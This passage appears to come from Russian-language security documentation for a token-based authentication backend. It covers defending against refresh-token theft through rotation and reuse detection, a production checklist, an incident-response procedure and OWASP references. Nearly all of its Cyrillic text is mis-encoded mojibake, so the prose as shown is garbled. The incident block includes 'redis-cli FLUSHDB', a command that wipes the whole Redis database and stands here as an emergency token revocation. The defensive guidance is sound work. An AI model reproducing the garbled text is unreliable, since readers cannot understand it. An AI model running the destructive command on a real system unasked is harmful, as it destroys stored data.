**–†–µ–∑—É–ª—å—Ç–∞—Ç:** ‚úÖ –ê—Ç–∞–∫–∞ –ø—Ä–æ–≤–∞–ª–∏–ª–∞—Å—å

---

### Session Hijacking

**–°—Ü–µ–Ω–∞—Ä–∏–π:**
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —É–∫—Ä–∞–ª refresh token

**–ó–∞—â–∏—Ç–∞ (rotation + reuse detection):**
1. –ñ–µ—Ä—Ç–≤–∞ –¥–µ–ª–∞–µ—Ç refresh ‚Üí —Å—Ç–∞—Ä—ã–π —Ç–æ–∫–µ–Ω –æ—Ç–æ–∑–≤–∞–Ω
2. –ê—Ç–∞–∫—É—é—â–∏–π –ø—ã—Ç–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç–∞—Ä—ã–π —Ç–æ–∫–µ–Ω
3. Backend –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ—Ç reuse ‚Üí –æ—Ç–∑—ã–≤–∞–µ—Ç –í–°–ï —Ç–æ–∫–µ–Ω—ã
4. –ñ–µ—Ä—Ç–≤–∞ –ø–æ–ª—É—á–∞–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ ‚Üí –º–µ–Ω—è–µ—Ç –ø–∞—Ä–æ–ª—å

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** ‚úÖ –ê—Ç–∞–∫–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞

---

## üìù Checklist –ø–µ—Ä–µ–¥ production

- [ ] `NODE_ENV=production` —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
- [ ] `COOKIE_SECRET` - —Å–∏–ª—å–Ω—ã–π —Å–ª—É—á–∞–π–Ω—ã–π –∫–ª—é—á (64+ —Å–∏–º–≤–æ–ª–æ–≤)
- [ ] `JWT_SECRET` ‚â† `COOKIE_SECRET` ‚â† `JWT_REFRESH_SECRET`
- [ ] HTTPS –Ω–∞—Å—Ç—Ä–æ–µ–Ω (secure cookies —Ä–∞–±–æ—Ç–∞—é—Ç)
- [ ] CORS whitelist —Å–æ–¥–µ—Ä–∂–∏—Ç —Ç–æ–ª—å–∫–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ domains
- [ ] Rate limiting –Ω–∞—Å—Ç—Ä–æ–µ–Ω
- [ ] Redis –Ω–∞—Å—Ç—Ä–æ–µ–Ω –∏ –¥–æ—Å—Ç—É–ø–µ–Ω
- [ ] –¢–µ—Å—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—Ä–æ–π–¥–µ–Ω—ã
- [ ] –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –Ω–∞—Å—Ç—Ä–æ–µ–Ω (–ª–æ–≥–∏ token reuse attacks)
- [ ] Backup plan –¥–ª—è –æ—Ç–∑—ã–≤–∞ –≤—Å–µ—Ö —Ç–æ–∫–µ–Ω–æ–≤ –≤ —Å–ª—É—á–∞–µ —É—Ç–µ—á–∫–∏

---

## üö® –í —Å–ª—É—á–∞–µ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞

### –ï—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—Ç–µ—á–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤:

```bash
# 1. –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –æ—Ç–æ–∑–≤–∞—Ç—å –í–°–ï —Ç–æ–∫–µ–Ω—ã –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
redis-cli FLUSHDB

# 2. –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —Ä–∞–∑–ª–æ–≥–∏–Ω–∏—Ç—å –≤—Å–µ—Ö
# 3. –ü–æ—Ç—Ä–µ–±–æ–≤–∞—Ç—å —Å–º–µ–Ω—É –ø–∞—Ä–æ–ª–µ–π
# 4. –†–æ—Ç–∏—Ä–æ–≤–∞—Ç—å JWT_SECRET –∏ COOKIE_SECRET
# 5. –ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ª–æ–≥–∏
```

---

## üìö –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã

- [OWASP: HttpOnly](https://owasp.org/www-community/HttpOnly)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)


